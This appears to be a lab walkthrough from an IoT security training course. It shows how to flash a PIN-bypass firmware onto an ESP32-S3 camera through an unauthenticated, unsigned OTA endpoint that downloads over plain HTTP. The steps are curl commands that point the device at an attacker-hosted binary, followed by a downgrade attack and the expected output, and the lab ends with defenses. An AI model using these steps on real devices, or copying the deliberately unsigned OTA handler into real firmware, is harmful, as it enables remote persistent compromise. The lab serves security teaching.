# L07: Unsigned OTA Updates

## Goal
Push malicious firmware to device remotely via unsigned OTA update for persistent compromise without physical access.

## Background

**Why this matters**: OTA (Over-The-Air) updates allow remote firmware installation. Without signature verification, attackers can push malicious firmware remotely for complete device compromise - one of the most critical IoT vulnerabilities.

**What you're looking for in IoT devices:**
- OTA update endpoints (web API, mobile app, cloud service)
- Lack of firmware signature verification
- HTTP (unencrypted) firmware downloads
- No authentication on OTA endpoints

**Why this happens:**
- Signature verification requires PKI infrastructure and key management
- Developers prioritize convenience over security for testing
- Legacy code where OTA was added as an afterthought

**On CoreS3**: The firmware exposes `POST /ota` (and `POST /ota/update`) endpoints that accept a `url` parameter pointing to a firmware binary. The handler downloads the binary over HTTP and flashes it using the ESP32 Update library without any signature verification.

```cpp
// From CameraDevice_Web.cpp - handleOTA()
String url = webServer->arg("url");
if (url.length() == 0) {
    url = "http://update.example.com/firmware.bin";  // Default - HTTP, no TLS
}

HTTPClient http;
http.begin(url);  // No HTTPS, no certificate validation

// ... downloads firmware ...
Update.writeStream(*stream);  // No signature verification before flashing
```

**Secure vs. Vulnerable OTA flow:**
- Secure: download firmware -> verify cryptographic signature -> install only if valid
- Vulnerable: download firmware -> skip verification -> install any firmware

**Finding OTA on unknown devices:**

1. **Network traffic analysis:** Capture traffic with Wireshark during boot. Look for HTTP requests to update servers (`/firmware.bin`, `/update`, `/ota`).

2. **Web interface reconnaissance:** Check admin panels for firmware update pages. Look for file upload forms accepting `.bin`, `.hex`, `.fw` files.

3. **Mobile app analysis:** Decompile APK/IPA and search for OTA endpoints and hardcoded update URLs.

4. **UART/Serial console:** Monitor boot logs for update check messages and update server URLs.

5. **Common OTA implementations:** ESP32 (HTTP download to OTA partition), Arduino (OTA with mDNS), Nordic nRF (DFU over BLE), STM32 (bootloader UART/USB).

## Lab Walkthrough

### Step 1: Discover the OTA Endpoint

The CoreS3 registers two equivalent OTA endpoints: `POST /ota` (primary) and `POST /ota/update` (alias). Both accept a `url` parameter via form-encoded or JSON body, with no authentication required.

```bash
# Connect to the device AP
# SSID: CoreS3-CAM-XXXX (open, no password), Device IP: 192.168.4.1

curl -s http://192.168.4.1/ | head -3
# Expected: <!DOCTYPE html><html><head>...

# Verify OTA endpoint exists (without triggering update)
curl -s -o /dev/null -w "%{http_code}" -X POST http://192.168.4.1/ota
# Expected: 502 (default URL http://update.example.com/firmware.bin is unreachable)
```

**Expected serial output when probing:**
```
[WEB] POST /ota
[OTA] Update requested: http://update.example.com/firmware.bin
[OTA] No signature verification configured - accepting arbitrary firmware.
[OTA] Downloading firmware over HTTP (no TLS)...
```

### Step 2: Prepare the Malicious Firmware

You need a patched firmware binary to push via OTA. If you completed L06 (Binary Patch & Reflash), reuse your `app_patched.bin` - it already has the PIN bypass and correct checksum/SHA256 hash.

```bash
# Reuse the patched binary from L06
cp app_patched.bin ota_payload.bin

# Verify it contains the original firmware version (L06 patches the PIN check, not the version string)
strings ota_payload.bin | grep "Firmware:"
# Should show: "Firmware: 1.0.0"

ls -lh ota_payload.bin
# Should be ~3.0M (same size as the extracted firmware)
```

If you have not completed L06, follow L05 Steps 2-6 or L06 Steps 1-6 first to create a patched firmware binary with valid checksum and SHA256 hash. The OTA handler validates the ESP32 image format the same way the bootloader does - a binary with a broken checksum will be rejected.

### Step 3: Host Malicious Firmware

Start a local HTTP server to serve the patched binary. The device's OTA handler fetches from any URL over plain HTTP - no TLS, no certificate pinning.

```bash
python3 -m http.server 8080 &
# Serving HTTP on 0.0.0.0 port 8080 ...

# Find your IP on the device's network:
ip addr show | grep "inet " | grep -v 127.0.0.1
# Example: 192.168.4.100 (if connected to device AP)

# Verify accessibility:
curl -s -o /dev/null -w "%{http_code} %{size_download} bytes\n" \
  http://localhost:8080/ota_payload.bin
# Expected: 200 with a byte count matching your ota_payload.bin file size
```

### Step 4: Push OTA Update to Device

Send the firmware URL to `/ota`. The handler downloads it, writes it to the OTA partition via `Update.writeStream()`, and reboots. Only the ESP32 image header (magic bytes, segment layout) is validated - not origin or authenticity.

```bash
curl -X POST http://192.168.4.1/ota \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=http://<YOUR_IP>:8080/ota_payload.bin"

# Expected response:
{"status":"accepted","message":"OTA update started","warning":"No signature verification!","url":"http://<YOUR_IP>:8080/ota_payload.bin"}
```

**Expected serial output:**
```
[WEB] POST /ota
[OTA] Update requested: http://<YOUR_IP>:8080/ota_payload.bin
[OTA] No signature verification configured - accepting arbitrary firmware.
[OTA] Downloading firmware over HTTP (no TLS)...
[OTA] Firmware size: XXXXXXX bytes
[OTA] Installing firmware...
[OTA] Update complete, rebooting...
ESP-ROM:esp32s3-20210327
Build:Mar 27 2021
rst:0xc (RTC_SW_CPU_RST),boot:0x28 (SPI_FAST_FLASH_BOOT)
```

**Alternative - JSON body:**
```bash
curl -X POST http://192.168.4.1/ota \
  -H "Content-Type: application/json" \
  -d '{"url":"http://<YOUR_IP>:8080/firmware.bin"}'
```

### Step 5: Verify Malicious Firmware Installed

Wait ~10-30 seconds for the device to reboot, then verify the patched firmware is running. If you used the L06 binary, the PIN bypass is the proof - the version string stays at 1.0.0 since L06 patches the PIN check function, not the version string.

```bash
# Check via HTTP
curl -s http://192.168.4.1/status | python3 -m json.tool
# Device should be up and responding

# Verify via serial console
pio device monitor -b 115200

cores3-cam> status
# Firmware: 1.0.0 (version unchanged - L06 patched PIN check, not version)
```

**Prove the OTA payload took effect:**

The L06 patch makes `checkUserPIN` always return true, so any PIN is accepted. Test via the serial console (works even without WiFi configured) or the touchscreen:

```
# Via serial console:
cores3-cam> login 000000
User authenticated.
# Any PIN is accepted - proves the patched firmware is running

# Or via touchscreen (if WiFi is configured and device shows PIN screen):
# Enter any wrong PIN -> device unlocks
```

This confirms the OTA pushed your patched firmware successfully without any signature verification.

### Step 6: Verify No Rollback Protection

The OTA handler also has no version checking or anti-rollback enforcement. If the URL path contains `v1.0.0`, the device logs a downgrade warning but installs the firmware anyway. This means an attacker can push older firmware with known vulnerabilities, undoing any security patches the vendor has released.

```bash
# Re-push the same payload with a "v1.0.0" URL path to trigger the rollback code path
mkdir -p /tmp/v1.0.0
cp ota_payload.bin /tmp/v1.0.0/firmware.bin

curl -X POST http://192.168.4.1/ota \
  -H "Content-Type: application/json" \
  -d '{"url":"http://<YOUR_IP>:8080/v1.0.0/firmware.bin"}'

# Expected response includes:
# "message": "Downgrade to v1.0.0 accepted"
# "warning": "No rollback protection!"
```

**Expected serial output:**
```
[OTA] No rollback protection enabled - accepting downgrade.
[OTA] Downloading firmware over HTTP (no TLS)...
[OTA] Update complete, rebooting...
```

The firmware detects the downgrade and logs a warning, but installs it anyway. The ESP32-S3 supports anti-rollback via eFuse-based monotonic counters (`CONFIG_BOOTLOADER_APP_ANTI_ROLLBACK=y` in sdkconfig), but this device has not enabled it. In a real scenario, the attacker would push an older firmware version with a known CVE, re-introducing a vulnerability the vendor already patched.

### Step 7: Restore Original Firmware

After the OTA update, the device boots from the `ota_0` partition. The original firmware is still in the `factory` partition, but the bootloader's OTA data tells it to use `ota_0` instead. You must erase flash to clear the OTA boot selection.

```bash
# Stop the HTTP server and clean up
kill %1
rm -rf /tmp/v1.0.0

# Close any serial monitors first

# Full erase clears all partitions including OTA boot selection
esptool --chip esp32s3 --port /dev/ttyACM0 erase_flash

# Reflash the clean firmware
pio run -e M5CoreS3 -t upload

# Verify
pio device monitor -b 115200
cores3-cam> status
# Should show: Firmware: 1.0.0

cores3-cam> login 000000
Invalid PIN.
# PIN bypass no longer works - clean firmware restored
```

## Impact

- **No signature verification**: `handleOTA()` uses `Update.writeStream()` which accepts any valid ESP32 binary
- **No authentication on OTA endpoint**: Any device on the network can trigger `POST /ota` without credentials
- **Plain HTTP download**: Firmware fetched without TLS, certificate validation, or pinning
- **Remote persistent compromise**: Attacker replaces all device firmware over the network; survives reboots
- **No rollback protection**: No anti-rollback counter, no eFuse monotonic version, no version comparison - older firmware with known vulnerabilities is accepted without question

## Defenses

**How to prevent unsigned OTA and rollback attacks on ESP32-S3:**
- **Sign OTA firmware**: Use ESP32 Secure Boot V2 (RSA-3072 or ECDSA) to verify firmware signatures before flashing
- **Enable anti-rollback**: Set `CONFIG_BOOTLOADER_APP_ANTI_ROLLBACK=y` and program eFuse monotonic counter - each release increments `security_version`, bootloader rejects lower
- **Authenticate OTA endpoints**: Require JWT or API key before accepting update requests
- **Use HTTPS**: Fetch firmware over TLS with certificate pinning to prevent man-in-the-middle substitution
- **Version check in application code**: Compare incoming version before accepting OTA

## References

- [ESP32 OTA Updates](https://docs.espressif.com/projects/esp-idf/en/latest/esp32/api-reference/system/ota.html)
- [ESP32-S3 Anti-Rollback Protection](https://docs.espressif.com/projects/esp-idf/en/latest/esp32s3/security/secure-boot-v2.html#anti-rollback)
- [ESP32 Secure Boot v2](https://docs.espressif.com/projects/esp-idf/en/latest/esp32s3/security/secure-boot-v2.html)
- [ESP32 Update Library](https://docs.espressif.com/projects/arduino-esp32/en/latest/api/update.html)
- [OWASP Firmware Security Testing Methodology](https://owasp.org/www-project-firmware-security-testing-methodology/)
- [CWE-494: Download of Code Without Integrity Check](https://cwe.mitre.org/data/definitions/494.html)
- [CWE-1328: Security Version Number Mutable to Older Versions](https://cwe.mitre.org/data/definitions/1328.html)
